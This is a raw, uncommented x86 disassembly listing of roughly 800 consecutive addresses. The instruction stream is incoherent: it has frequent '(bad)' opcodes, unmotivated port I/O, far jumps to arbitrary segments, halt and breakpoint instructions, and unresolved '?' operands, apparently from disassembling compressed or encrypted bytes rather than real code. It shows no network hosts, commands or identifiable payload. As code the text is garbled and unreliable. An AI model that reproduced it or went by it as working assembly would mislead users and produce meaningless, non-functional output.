  4051fd:	add    ah,ch
  4051ff:	mov    BYTE PTR [edi+0x293cb1c7],bl
  405205:	jmp    0x4051f7
  405207:	test   DWORD PTR [ebx],eax
  405209:	sub    eax,ecx
  40520b:	popa   
  40520c:	rcl    BYTE PTR [esp+0x14],cl
  405210:	in     eax,0x70
  405212:	fyl2xp1 
  405214:	jmp    0xd45b:0xef4329b5
  40521b:	mov    ch,0xf5
  40521d:	test   DWORD PTR [edi],esi
  40521f:	mov    ebx,DWORD PTR [eax-0xe]
  405222:	je     0x405215
  405224:	jl     0x405214
  405226:	das    
  405227:	push   esp
  405228:	pop    esp
  405229:	jecxz  0x4052a6
  40522b:	push   ds
  40522c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40522d:	inc    ebx
  40522e:	or     ah,BYTE PTR [ecx-0x38a8db29]
  405234:	adc    DWORD PTR [ebx+ebx*8],esi
  405237:	mov    ch,BYTE PTR [esi]
  405239:	cld    
  40523a:	mov    ds:0xea9db35e,al
  40523f:	add    BYTE PTR [eax],0xee
  405242:	(bad)  [esi+edi*8]
  405245:	push   cs
  405246:	loop   0x405295
  405248:	icebp  
  405249:	dec    esi
  40524a:	data16 test BYTE PTR [ebp+eiz*2-0x336117d],0x67
  405253:	add    eax,0xefb156bb
  405259:	adc    bl,BYTE PTR [ecx]
  40525b:	add    al,0x53
  40525d:	mov    ch,0x16
  40525f:	clc    
  405260:	jp     0x405266
  405262:	ret    
  405263:	and    eax,0xa05337ab
  405268:	adc    esp,DWORD PTR ds:[ebx]
  40526b:	ja     0x40529f
  40526d:	dec    ebp
  40526e:	sub    eax,0x6e1ddd22
  405273:	shl    BYTE PTR [edi+0x7ed147a7],1
  405279:	or     esi,DWORD PTR [edi-0x4f7c747f]
  40527f:	sub    esi,DWORD PTR [esi+0x13]
  405282:	hlt    
  405283:	add    dl,dl
  405285:	mov    ch,BYTE PTR [edi]
  405287:	push   esi
  405288:	(bad)  
  405289:	aad    0x67
  40528b:	cwde   
  40528c:	add    bl,BYTE PTR [ecx+0x4b8e99f4]
  405292:	retf   0x734a
  405295:	jb     0x4052e8
  405297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405298:	retf   0xfffe
  40529b:	mov    ebp,0x157cc8d9
  4052a0:	mov    edi,0x17aae270
  4052a5:	not    DWORD PTR [ecx+0x24ccfa69]
  4052ab:	icebp  
  4052ac:	xchg   DWORD PTR [esi-0x8],ebx
  4052af:	data16 mov WORD PTR [edx+0x7553ad70],fs
  4052b6:	imul   esp,DWORD PTR [esi-0x72a71069],0xffffffb7
  4052bd:	inc    edx
  4052be:	and    dh,dh
  4052c0:	lahf   
  4052c1:	xchg   ebp,eax
  4052c2:	pop    eax
  4052c3:	in     al,dx
  4052c4:	ins    DWORD PTR es:[edi],dx
  4052c5:	pop    ebx
  4052c6:	sub    al,0x2f
  4052c8:	jb     0x4052b2
  4052ca:	inc    esi
  4052cb:	pusha  
  4052cc:	jne    0x4052e9
  4052ce:	sar    DWORD PTR [eax+0x28863cf8],0x35
  4052d5:	jp     0x4052b3
  4052d7:	and    DWORD PTR [esi],esi
  4052d9:	loopne 0x405297
  4052db:	fst    DWORD PTR [edi]
  4052dd:	xor    BYTE PTR [esi+edi*8],dh
  4052e0:	and    eax,ebp
  4052e2:	push   edx
  4052e3:	int    0x7c
  4052e5:	fisubr DWORD PTR [eax]
  4052e7:	mov    esi,0x9a4b52a5
  4052ec:	ss jecxz 0x405297
  4052ef:	arpl   WORD PTR [esi-0xe],ax
  4052f2:	or     al,0x93
  4052f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052f5:	cmp    dh,BYTE PTR [ebp+0x6d]
  4052f8:	out    dx,al
  4052f9:	(bad)  
  4052fb:	lea    eax,[ecx-0x26ba817c]
  405301:	sbb    DWORD PTR [edx],esp
  405303:	mov    dl,0x48
  405305:	xlat   BYTE PTR ds:[ebx]
  405306:	(bad)  
  405307:	xlat   BYTE PTR ds:[ebx]
  405308:	jecxz  0x40535d
  40530a:	push   eax
  40530b:	and    eax,DWORD PTR [ecx-0xb]
  40530e:	ins    DWORD PTR es:[edi],dx
  40530f:	adc    eax,0xd4f6b603
  405314:	jb     0x40538b
  405316:	sub    eax,DWORD PTR [esi-0x20]
  405319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40531a:	or     BYTE PTR [esi-0x2ac66c32],ah
  405320:	scas   al,BYTE PTR es:[edi]
  405321:	in     eax,dx
  405322:	adc    ecx,esi
  405324:	xchg   edi,ecx
  405326:	lea    edx,[edx]
  405328:	iret   
  405329:	sti    
  40532a:	dec    edx
  40532b:	sub    ebp,ebp
  40532d:	or     dh,BYTE PTR [esi-0x3ad0a660]
  405333:	inc    bh
  405335:	pop    ebp
  405336:	sbb    al,0xb4
  405338:	int    0x6c
  40533a:	scas   eax,DWORD PTR es:[edi]
  40533b:	or     eax,0xf1ed6136
  405340:	jl     0x405348
  405342:	xchg   DWORD PTR [edi+0x17],esp
  405345:	mov    ds:0xe45de585,eax
  40534a:	mov    al,ds:0xc09edf63
  40534f:	fidivr WORD PTR [ebp+edi*1+0x35]
  405353:	pop    ebx
  405354:	inc    ebx
  405355:	sar    ecx,0x26
  405358:	xlat   BYTE PTR ds:[ebx]
  405359:	mov    ebx,0xe2136659
  40535e:	aaa    
  40535f:	popf   
  405360:	pop    ecx
  405361:	add    eax,0xa3bc57ed
  405366:	sbb    al,0xb6
  405368:	cmp    BYTE PTR [esi-0x20ba073],ch
  40536e:	sub    edx,0xc5c47b1
  405374:	retf   
  405375:	or     al,ah
  405377:	mov    esi,0x4b7d7fa6
  40537c:	test   DWORD PTR [edi],ecx
  40537e:	pop    ecx
  40537f:	pusha  
  405380:	mov    dl,0x11
  405382:	jb     0x4053a4
  405384:	ficom  DWORD PTR [eax+0x72c2caa0]
  40538a:	mov    dh,0x9e
  40538c:	es mov ecx,0x8e6dc2c0
  405392:	dec    esp
  405393:	ins    DWORD PTR es:[edi],dx
  405394:	inc    edx
  405395:	(bad)  
  405396:	loopne 0x405405
  405398:	test   BYTE PTR [edi],0xed
  40539b:	or     ch,0x5c
  40539e:	dec    BYTE PTR [ecx]
  4053a0:	std    
  4053a1:	xor    al,0x62
  4053a3:	cmp    al,0x72
  4053a5:	ds mov edi,0x342ee576
  4053ab:	dec    edx
  4053ac:	mov    edx,0xf528eace
  4053b1:	mov    al,ds:0x3b2489c2
  4053b6:	and    BYTE PTR [eax],ah
  4053b8:	mov    cl,BYTE PTR [esi]
  4053ba:	or     cl,bl
  4053bc:	xor    esp,DWORD PTR [ebp+0x6672cb4c]
  4053c2:	and    edx,DWORD PTR [eax]
  4053c4:	jb     0x405435
  4053c6:	jmp    FWORD PTR [eax-0x77]
  4053c9:	push   0x2268ff5c
  4053ce:	retf   0x36b4
  4053d1:	int3   
  4053d2:	pop    ecx
  4053d3:	dec    ebp
  4053d4:	shl    ch,cl
  4053d6:	js     0x4053f7
  4053d8:	jbe    0x405425
  4053da:	inc    ecx
  4053db:	jbe    0x405365
  4053dd:	pop    eax
  4053de:	and    eax,0xc8e54098
  4053e3:	jp     0x405459
  4053e5:	mov    ah,0xfb
  4053e7:	pop    ebx
  4053e8:	xchg   esp,esi
  4053ea:	(bad)  
  4053eb:	(bad)  
  4053ec:	push   eax
  4053ed:	push   0xffffffe3
  4053ef:	xchg   ebx,eax
  4053f0:	jmp    0x40537e
  4053f2:	(bad)
  4053f6:	stos   DWORD PTR es:[edi],eax
  4053f7:	xchg   ecx,eax
  4053f8:	enter  0xf3ca,0xb4
  4053fc:	rcr    edx,cl
  4053fe:	lock jmp 0xaca2:0x91331a1c
  405406:	in     eax,0xa8
  405408:	or     al,0xc2
  40540a:	dec    edi
  40540b:	jns    0x4053f3
  40540d:	popf   
  40540e:	out    0xba,al
  405410:	fwait
  405411:	scas   eax,DWORD PTR es:[edi]
  405412:	iret   
  405413:	jo     0x4053ac
  405415:	and    BYTE PTR [edi],ch
  405417:	(bad)  [ebp-0x6c2d6dbc]
  40541d:	cmp    BYTE PTR [esi+0x1d],0x70
  405421:	(bad)
  405424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405425:	ins    BYTE PTR es:[edi],dx
  405426:	pop    ds
  405427:	cs (bad) 
  405429:	pop    ebx
  40542a:	stos   DWORD PTR es:[edi],eax
  40542b:	push   0x63
  40542d:	out    dx,ax
  40542f:	jnp    0x40545f
  405431:	(bad)  [esi+0x18]
  405434:	mov    eax,0x4f5e035a
  405439:	cs push eax
  40543b:	(bad)  
  40543c:	push   esi
  40543d:	fisttp QWORD PTR [ebx+0x3]
  405440:	call   0x81eb:0xe6c67321
  405447:	lock int 0x67
  40544a:	scas   eax,DWORD PTR es:[edi]
  40544b:	inc    ebp
  40544c:	ja     0x4053d5
  40544e:	xor    esp,DWORD PTR [eax-0x2f7f3137]
  405454:	dec    esp
  405455:	in     eax,0x83
  405457:	or     al,0x2a
  405459:	and    DWORD PTR [ecx+0x757a5e1b],0x3aa639cb
  405463:	push   edx
  405464:	push   esp
  405465:	and    eax,0x6d9c2fe8
  40546a:	ss call 0xfa2b:0x7ceb81e1
  405472:	fcom   QWORD PTR [ecx]
  405475:	out    dx,al
  405476:	jmp    0x405427
  405478:	ss jne 0x405431
  40547b:	pop    edx
  40547c:	push   ds
  40547d:	xor    edx,ebp
  40547f:	adc    al,BYTE PTR [ebx+0x3]
  405482:	mov    ch,0x4e
  405484:	imul   esi,DWORD PTR [ebx+0x17],0xc8bb4391
  40548b:	cld    
  40548c:	xor    esp,DWORD PTR [edi-0x65712639]
  405492:	xchg   ecx,eax
  405493:	loopne 0x4054bf
  405495:	jns    0x40547e
  405497:	leave  
  405498:	add    bh,BYTE PTR [ecx]
  40549a:	leave  
  40549b:	sbb    DWORD PTR [edx+0x520aad1],0xffffffa6
  4054a2:	dec    ecx
  4054a3:	sbb    eax,DWORD PTR [ebp+0x4935e86b]
  4054a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054aa:	bound  esi,QWORD PTR [ebx+edx*4+0x1]
  4054ae:	mov    al,0x40
  4054b0:	jmp    0x40547e
  4054b2:	loopne 0x4054d6
  4054b4:	sbb    esi,DWORD PTR [edi+0x6fddae9]
  4054ba:	cli    
  4054bb:	pop    edi
  4054bc:	addr16 out 0xf1,al
  4054bf:	sti    
  4054c0:	bound  ecx,QWORD PTR [ecx+0x65ddef0]
  4054c6:	mov    esi,0x7b70d1ec
  4054cb:	jge    0x4054fa
  4054cd:	stos   DWORD PTR es:[edi],eax
  4054ce:	ret    0x52a
  4054d1:	ret    0xc83
  4054d4:	xchg   esi,eax
  4054d5:	push   ebx
  4054d6:	std    
  4054d7:	imul   esp,DWORD PTR [bp+di+0x44],0x2a81ff11
  4054df:	jbe    0x4054dc
  4054e1:	in     al,0x2a
  4054e3:	adc    cl,BYTE PTR [esp+ebp*2+0x6d]
  4054e7:	stos   BYTE PTR es:[edi],al
  4054e8:	mov    eax,ds:0xe4ee2615
  4054ed:	test   BYTE PTR [ebx+0x517b2fc2],dl
  4054f3:	xchg   BYTE PTR [ecx],ah
  4054f5:	inc    ebx
  4054f6:	mov    bl,0x7f
  4054f8:	push   edx
  4054f9:	out    0x7b,al
  4054fb:	div    BYTE PTR [eax-0x7eeda5c1]
  405501:	add    esi,DWORD PTR [edx+0x65370ef]
  405507:	(bad)  
  405508:	outs   dx,BYTE PTR ds:[esi]
  405509:	xor    DWORD PTR [esi+0x79d14142],ecx
  40550f:	cmp    ebp,DWORD PTR [edi]
  405511:	pop    es
  405512:	dec    ebx
  405513:	sbb    BYTE PTR [eax-0x4295a493],bh
  405519:	pop    esp
  40551a:	jle    0x40553f
  40551c:	add    cl,bl
  40551e:	ret    0x87e3
  405521:	fsubr  DWORD PTR [esi+0x217e0714]
  405527:	lds    ebp,FWORD PTR [ecx-0x3abaaa5f]
  40552d:	sahf   
  40552e:	dec    ebp
  40552f:	ret    0xe313
  405532:	das    
  405533:	repnz pop esi
  405535:	inc    ecx
  405536:	fcmovnb st,st(6)
  405538:	je     0x405508
  40553a:	retf   
  40553b:	leave  
  40553c:	push   es
  40553d:	push   edx
  40553e:	(bad)  
  40553f:	dec    ebp
  405540:	shr    ah,1
  405542:	sbb    BYTE PTR [edi-0x67],0x9
  405546:	call   0xd502279e
  40554b:	(bad)  
  40554c:	cmc    
  40554d:	aas    
  40554e:	test   BYTE PTR [eax+0x28],ah
  405551:	enter  0x48fd,0xc5
  405555:	aad    0x5b
  405557:	out    0xd8,al
  405559:	(bad)  
  40555a:	mov    ds:0xbbd8dc69,al
  40555f:	inc    ebp
  405560:	pop    es
  405561:	xchg   BYTE PTR [edi],dh
  405563:	loopne 0x405590
  405565:	jecxz  0x4055c2
  405567:	jle    0x40552a
  405569:	jbe    0x4055ab
  40556b:	or     BYTE PTR [eax],dl
  40556d:	inc    edx
  40556e:	popf   
  40556f:	enter  0x1b1e,0xd0
  405573:	cmp    DWORD PTR ds:0x5d844095,esp
  405579:	iret   
  40557a:	fmul   QWORD PTR [ebp+0x4a]
  40557d:	scas   al,BYTE PTR es:[edi]
  40557e:	jge    0x4055da
  405580:	inc    edi
  405581:	dec    eax
  405582:	retf   
  405583:	mov    ch,0x84
  405585:	hlt    
  405586:	test   BYTE PTR [edi+0x67a5c47c],bl
  40558c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40558d:	xchg   ecx,eax
  40558e:	dec    ecx
  40558f:	push   esi
  405590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405591:	(bad)  
  405592:	call   0x58c0b85a
  405597:	scas   al,BYTE PTR es:[edi]
  405598:	in     al,dx
  405599:	std    
  40559a:	and    DWORD PTR [edi+0x23],0xffffff97
  40559e:	or     al,dh
  4055a0:	loopne 0x40552f
  4055a2:	pop    es
  4055a3:	and    dl,BYTE PTR [ebp+0x21]
  4055a6:	mov    al,0xd1
  4055a8:	sub    BYTE PTR [eax-0x14],ah
  4055ab:	ror    DWORD PTR [esp+eiz*2-0x7f9ff495],0xe9
  4055b3:	mov    es,WORD PTR [esi]
  4055b5:	outs   dx,BYTE PTR ds:[esi]
  4055b6:	dec    esi
  4055b7:	adc    esi,0x4a
  4055ba:	addr16 cdq 
  4055bc:	fwait
  4055bd:	add    DWORD PTR [ebp+0x41],0x4f3520ca
  4055c4:	sar    DWORD PTR [eax-0x13],0x3d
  4055c8:	aam    0x8
  4055ca:	sbb    al,0x20
  4055cc:	push   ebx
  4055cd:	inc    ebp
  4055ce:	or     DWORD PTR ds:0x72783f14,eax
  4055d4:	add    ebx,eax
  4055d6:	cmp    BYTE PTR [eax-0x61],dh
  4055d9:	sub    BYTE PTR [eax],bh
  4055db:	lock dec eax
  4055dd:	jp     0x405651
  4055df:	and    edi,DWORD PTR [edi]
  4055e1:	sbb    DWORD PTR [esi],edx
  4055e3:	mov    dh,0x35
  4055e5:	jecxz  0x40560a
  4055e7:	add    BYTE PTR [eax],al
  4055e9:	fwait
  4055ea:	add    DWORD PTR [esi-0x7],edi
  4055ed:	cmp    BYTE PTR [eax],bl
  4055ef:	std    
  4055f0:	ins    DWORD PTR es:[edi],dx
  4055f1:	pop    esp
  4055f2:	or     eax,0x5ba6f9e3
  4055f7:	test   eax,0x8754ad1c
  4055fc:	fmul   DWORD PTR [esi-0x52]
  4055ff:	adc    ah,0xfd
  405602:	retf   
  405603:	sar    DWORD PTR [edx+0x6c],1
  405606:	xlat   BYTE PTR ds:[ebx]
  405607:	ja     0x4055e0
  405609:	push   ecx
  40560a:	popf   
  40560b:	stos   DWORD PTR es:[edi],eax
  40560c:	push   edx
  40560d:	dec    eax
  40560e:	lock loop 0x405608
  405611:	cmp    DWORD PTR [ebp+0x48],ecx
  405614:	pop    edi
  405615:	sar    BYTE PTR [ebx+ebx*1+0x7fee9bf5],cl
  40561c:	xchg   esp,eax
  40561d:	push   esp
  40561e:	sbb    al,0x32
  405620:	fs or  eax,0xac7aa638
  405626:	and    DWORD PTR [eax],esi
  405628:	rcr    BYTE PTR [ebp-0x5056ae73],cl
  40562e:	fadd   st,st(7)
  405630:	test   DWORD PTR [edi+0x6efe268e],edx
  405636:	inc    eax
  405637:	mov    ds:0xce162bf7,eax
  40563c:	test   esi,ebp
  40563e:	push   0x47287661
  405643:	sub    BYTE PTR [ebx],ah
  405645:	scas   eax,DWORD PTR es:[edi]
  405646:	aam    0xaa
  405648:	jnp    0x405648
  40564a:	hlt    
  40564b:	retf   
  40564c:	or     ah,ah
  40564e:	ss push ecx
  405650:	loop   0x40562b
  405652:	sbb    DWORD PTR ds:0xc396c31f,esp
  405658:	push   ecx
  405659:	into   
  40565a:	aad    0x3c
  40565c:	mov    ecx,0xe9005ce3
  405661:	pusha  
  405662:	pop    ebp
  405663:	fdiv   QWORD PTR [eax]
  405665:	mov    bl,0x37
  405667:	mov    edx,0xa91e791f
  40566c:	jmp    0x405675
  40566e:	push   eax
  40566f:	sub    DWORD PTR [esi+0x77777a70],ecx
  405675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405676:	pop    ss
  405677:	stos   BYTE PTR es:[edi],al
  405678:	mov    edx,0xe99a83a
  40567d:	and    eax,0x421ccf32
  405682:	mov    eax,0x4b757785
  405687:	lods   al,BYTE PTR ds:[esi]
  405688:	jl     0x4056fc
  40568a:	mov    esp,0x85ad239d
  40568f:	push   ebp
  405690:	fisttp DWORD PTR [ecx+0x257323c2]
  405696:	cld    
  405697:	test   BYTE PTR [edi-0x39],ch
  40569a:	or     BYTE PTR [ebx-0x669e46fa],al
  4056a0:	xlat   BYTE PTR ds:[ebx]
  4056a1:	scas   al,BYTE PTR es:[edi]
  4056a2:	(bad)  
  4056a3:	mov    ebx,0x525a26c4
  4056a8:	add    BYTE PTR [ecx],0xc6
  4056ab:	push   0x43
  4056ad:	push   DWORD PTR [esi-0x22]
  4056b0:	or     bh,BYTE PTR [edi]
  4056b2:	mov    edi,0xd93f7e1f
  4056b7:	ret    0x6e07
  4056ba:	or     esp,esp
  4056bc:	enter  0xfcb9,0x45
  4056c0:	and    BYTE PTR [eax+0x5c],ah
  4056c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056c4:	xchg   esi,eax
  4056c5:	ins    BYTE PTR es:[edi],dx
  4056c6:	mov    eax,DWORD PTR [eax]
  4056c8:	push   0x355bc970
  4056cd:	and    eax,0x6aabc19f
  4056d2:	adc    edx,DWORD PTR [eax]
  4056d4:	mov    al,0x32
  4056d6:	mov    al,ds:0xa36ec395
  4056db:	push   eax
  4056dc:	sub    BYTE PTR [eax+ecx*2+0x1f005dfe],al
  4056e3:	add    ecx,ebx
  4056e5:	fs pop edx
  4056e7:	test   dl,al
  4056e9:	ins    DWORD PTR es:[edi],dx
  4056ea:	dec    ebx
  4056eb:	fld    QWORD PTR [esi-0x79]
  4056ee:	add    DWORD PTR [edx],ecx
  4056f0:	outs   dx,BYTE PTR ds:[esi]
  4056f1:	repnz out dx,al
  4056f3:	aaa    
  4056f4:	xchg   edx,eax
  4056f5:	stc    
  4056f6:	jbe    0x405692
  4056f8:	pop    edx
  4056f9:	mov    esi,0x65d1c420
  4056fe:	hlt    
  4056ff:	(bad)  
  405700:	daa    
  405701:	in     al,0x1a
  405703:	(bad)  
  405704:	pop    edi
  405705:	cmp    eax,0x2d0b0e71
  40570a:	aaa    
  40570b:	fs mov bl,0x0
  40570e:	pop    eax
  40570f:	mov    ?,esp
  405711:	adc    BYTE PTR [ebx],ah
  405713:	test   eax,0x936cbfa8
  405718:	ds push edi
  40571a:	xchg   ebp,eax
  40571b:	call   0xea79e39c
  405720:	jle    0x405736
  405722:	xor    ch,dh
  405724:	les    edx,FWORD PTR [eax]
  405726:	xor    bh,BYTE PTR [esi]
  405728:	jbe    0x4056e0
  40572a:	cmc    
  40572b:	and    ecx,ebp
  40572d:	out    dx,eax
  40572e:	repnz push esp
  405730:	xchg   ebx,eax
  405731:	inc    edx
  405732:	xor    eax,0xa241d12c
  405737:	into   
  405738:	imul   ecx,DWORD PTR [esi],0x13
  40573b:	inc    edi
  40573c:	sbb    al,0xfa
  40573e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40573f:	pop    ebx
  405740:	rol    edi,1
  405742:	arpl   WORD PTR [edi-0x3538e5c5],di
  405748:	and    BYTE PTR [esi+0x4],al
  40574b:	jnp    0x405700
  40574d:	jg     0x405723
  40574f:	inc    edx
  405750:	mov    edx,0x1d948f61
  405755:	mov    edi,0xb5082f2a
  40575a:	dec    eax
  40575b:	sub    bh,bh
  40575d:	(bad)  
  40575e:	out    0xc8,eax
  405760:	push   esp
  405761:	(bad)  
  405762:	dec    esp
  405763:	test   eax,0x49a41f58
  405768:	ret    
  405769:	xor    ah,BYTE PTR fs:[eax-0x64]
  40576d:	xor    DWORD PTR [edx+0x30],0xb
  405771:	imul   ebx,DWORD PTR [edx-0x169f41a4],0x8280bdea
  40577b:	or     al,0x87
  40577d:	inc    ebx
  40577e:	pop    ecx
  40577f:	js     0x405791
  405781:	enter  0x87be,0xf8
  405785:	cmp    eax,0x7cc0625f
  40578a:	retf   
  40578b:	out    dx,eax
  40578c:	add    al,0x97
  40578e:	sti    
  40578f:	sbb    ch,BYTE PTR [edi-0x352c6313]
  405795:	out    dx,eax
  405796:	xor    al,0x7
  405798:	shl    DWORD PTR [edi],1
  40579a:	pop    es
  40579b:	mov    ebx,0x413ce818
  4057a0:	xor    eax,0xacfd751a
  4057a5:	xlat   BYTE PTR ds:[ebx]
  4057a6:	daa    
  4057a7:	fcomp  DWORD PTR ss:[esi+edx*4+0x64157cb7]
  4057af:	cmp    ecx,DWORD PTR [edx+0x2f650b52]
  4057b5:	loope  0x40578b
  4057b7:	cli    
  4057b8:	out    0xc6,al
  4057ba:	mov    ch,0x61
  4057bc:	mov    edx,0xb37d0861
  4057c1:	inc    ebx
  4057c2:	enter  0x256d,0xd1
  4057c6:	inc    eax
  4057c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057c8:	xor    al,0xc7
  4057ca:	or     BYTE PTR [ebx],0x50
  4057cd:	push   ecx
  4057ce:	xor    al,0x41
  4057d0:	xor    BYTE PTR [ebx+esi*2],al
  4057d3:	mov    al,0xcf
  4057d5:	push   esp
  4057d6:	or     DWORD PTR [esi],0xffffffcf
  4057d9:	mov    dh,0x6d
  4057db:	fisubr WORD PTR [ebp-0x383fd292]
  4057e1:	jmp    0x3aba932
  4057e6:	icebp  
  4057e7:	clc    
  4057e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057e9:	retf   0x64e2
  4057ec:	aaa    
  4057ed:	push   0xffffffeb
  4057ef:	dec    edx
  4057f0:	xor    al,0xd6
  4057f2:	inc    ebx
  4057f3:	dec    edi
  4057f4:	sti    
  4057f5:	push   esi
  4057f6:	movhps QWORD PTR [edx],xmm4
  4057f9:	pop    esi
  4057fa:	adc    ecx,DWORD PTR gs:[esi-0x3177cfe3]
  405801:	je     0x40584d
  405803:	jno    0x4057b0
  405805:	das    
  405806:	aas    
  405807:	push   cs
  405808:	and    esi,DWORD PTR [ebx+0x45]
  40580b:	push   cs
  40580c:	inc    ecx
  40580d:	sbb    DWORD PTR [ebx-0x4d30113d],0x38
  405814:	xor    bl,BYTE PTR [ebx+0x5f]
  405817:	adc    DWORD PTR [esi+0x7fab0a16],edx
  40581d:	stos   DWORD PTR es:[edi],eax
  40581e:	lods   eax,DWORD PTR ds:[esi]
  40581f:	retf   
  405820:	repz cdq 
  405822:	mov    ds:0xa9acacb5,eax
  405827:	xor    al,0xfa
  405829:	imul   esi,DWORD PTR [ebx],0x94adc1b0
  40582f:	mov    ecx,edi
  405831:	cmp    dh,bh
  405833:	das    
  405834:	mov    ds:0xdfe779cb,al
  405839:	inc    edi
  40583a:	cli    
  40583b:	push   esi
  40583c:	cld    
  40583d:	sar    bl,1
  40583f:	test   eax,esi
  405841:	dec    edx
  405842:	stos   DWORD PTR es:[edi],eax
  405843:	sbb    eax,0xcbec48a1
  405848:	or     BYTE PTR [ecx-0x346e4d99],cl
  40584e:	jg     0x40583d
  405850:	inc    ebx
  405851:	shl    BYTE PTR [edx],cl
  405853:	not    DWORD PTR [esi]
  405855:	add    al,0x60
  405858:	fwait
  405859:	push   ss
  40585a:	and    edx,DWORD PTR [ebx+0x2]
  40585d:	pop    edi
  40585e:	test   eax,0x48db9ada
  405863:	jno    0x4058cc
  405865:	loopne 0x4057ed
  405867:	das    
  405868:	mov    edi,0xf65c8da8
  40586d:	daa    
  40586e:	xchg   esp,eax
  40586f:	mov    ds:0x79001348,al
  405874:	or     bl,BYTE PTR [edx+0x5b]
  405877:	nop
  405878:	xor    eax,0x3a26e984
  40587d:	sbb    BYTE PTR [edi-0x793b4915],bh
  405883:	mov    ebx,0x251db418
  405888:	or     dh,ah
  40588a:	xchg   edi,eax
  40588b:	mov    BYTE PTR [ebx-0x39],cl
  40588e:	lea    ebp,ds:0x6caace2a
  405894:	out    0x4,al
  405896:	call   0x97445aa4
  40589b:	mov    BYTE PTR [edx],dl
  40589d:	in     eax,0xdf
  40589f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058a0:	and    edi,DWORD PTR [ebx+0x6f35fe3b]
  4058a6:	push   esi
  4058a7:	sub    ah,BYTE PTR [ebp-0x690f2f76]
  4058ad:	neg    BYTE PTR [edi-0x2da2e215]
  4058b3:	aad    0xb
  4058b5:	xor    BYTE PTR [edi-0x29b1e113],cl
  4058bb:	mov    DWORD PTR [edx],ebp
  4058bd:	sti    
  4058be:	pusha  
  4058bf:	cs pop es
  4058c1:	loop   0x4058c0
  4058c3:	jp     0x40586a
  4058c5:	sbb    esi,edi
  4058c7:	jno    0x405862
  4058c9:	xor    cl,BYTE PTR [eax+0x17]
  4058cc:	cmp    eax,ebx
  4058ce:	inc    ebp
  4058cf:	(bad)  
  4058d0:	jbe    0x405859
  4058d2:	mov    ecx,0x4680f88c
  4058d7:	mov    edi,0x9d7f4620
  4058dc:	(bad)  
  4058de:	adc    dh,ah
  4058e0:	pop    esi
  4058e1:	out    0x1f,al
  4058e3:	mov    ?,WORD PTR [ebx+0x11f01135]
  4058e9:	push   cs
  4058ea:	shl    DWORD PTR [esi+0x245ffd99],0xe
  4058f1:	repnz mov edx,0xcdd25884
  4058f7:	sub    eax,0x656ae953
  4058fc:	mov    ds:0x321b397,eax
  405901:	inc    esp
  405902:	xchg   BYTE PTR [edx-0x62b289e2],ah
  405908:	dec    ecx
  405909:	cwde   
  40590a:	push   0xffffffe7
  40590c:	cwde   
  40590d:	cmp    ch,BYTE PTR [edx+0x3e]
  405910:	loope  0x4058a0
  405912:	call   0x9294a097
  405917:	jmp    0x405998
  405919:	inc    esi
  40591a:	ja     0x40592e
  40591c:	and    BYTE PTR [ebx-0x4c],ah
  40591f:	in     al,dx
  405920:	or     ebp,ecx
  405922:	mov    ah,0xf1
  405924:	sar    bh,cl
  405926:	jmp    0x4c18:0x7fca61a7
  40592d:	mov    edi,esp
  40592f:	adc    esi,DWORD PTR [ebx+0x63]
  405932:	mov    al,ds:0x623c94e8
  405937:	ins    BYTE PTR es:[edi],dx
  405938:	popa   
  405939:	push   ecx
  40593a:	jle    0x40590f
  40593c:	mov    dl,BYTE PTR [ecx]
  40593e:	repnz arpl bx,di
  405941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405942:	icebp  
  405943:	ss and bl,dh
  405946:	mov    ebp,0xa062f6c2
  40594b:	shl    dh,0x92
  40594e:	sub    al,bh
  405950:	(bad)  
  405951:	dec    ebp
  405952:	jle    0x4058fa
  405954:	mov    ebx,0x75cc4cea
  405959:	pop    ecx
  40595a:	xchg   BYTE PTR [edi],ah
  40595c:	dec    edi
  40595d:	loopne 0x4059b6
  40595f:	jecxz  0x405997
  405961:	jmp    0xe04e:0x82f29434
  405968:	out    dx,al
  405969:	nop
  40596a:	test   BYTE PTR gs:[ebp-0x1b],bh
  40596e:	sahf   
  40596f:	mov    esi,0xbf7aa7d6
  405974:	pop    ebx
  405975:	addr16 (bad) 
  405977:	in     eax,0xc8
  405979:	icebp  
  40597a:	rol    BYTE PTR [ecx+0x7c],1
  40597d:	pop    ebp
  40597e:	out    0x1,al
  405980:	aam    0x73
  405982:	(bad)  
  405983:	dec    ebp
  405984:	sar    BYTE PTR [eax-0x3cae9a21],0x52
  40598b:	jle    0x4059f1
  40598d:	pop    esi
  40598e:	jmp    0x40596f
  405990:	add    BYTE PTR ds:0x4aa02ebe,cl
  405996:	mov    dl,0xe
  405998:	mov    ebp,0x94115ff3
  40599d:	fs add eax,0xfb924162
  4059a3:	test   eax,0x73d718f8
  4059a8:	iret   
  4059a9:	push   edi
  4059aa:	shl    DWORD PTR [ecx-0x6],0x65
  4059ae:	or     ebx,DWORD PTR [edx]
  4059b0:	out    dx,al
  4059b1:	xchg   bh,ch
  4059b3:	mov    eax,0xbca1facd
  4059b8:	inc    ecx
  4059b9:	xchg   esi,eax
  4059ba:	mov    eax,ds:0xf1190903
  4059bf:	cmp    BYTE PTR [edx],cl
  4059c1:	loopne 0x4059e6
  4059c3:	xor    eax,0x194f2c0
  4059c8:	dec    esi
  4059c9:	cmp    eax,0xad4b1701
  4059ce:	sbb    al,0x58
  4059d0:	js     0x4059d1
  4059d2:	xchg   esi,eax
  4059d3:	cmp    BYTE PTR [eax+0x831b120],bh
  4059d9:	adc    ecx,DWORD PTR [ebx+0x4068def0]
  4059df:	ror    BYTE PTR [edi],1
  4059e1:	push   cs
  4059e2:	ss mov ch,0xf3
  4059e5:	mov    ch,0xa4
  4059e7:	push   esp
  4059e8:	mov    ds:0xd96b254a,al
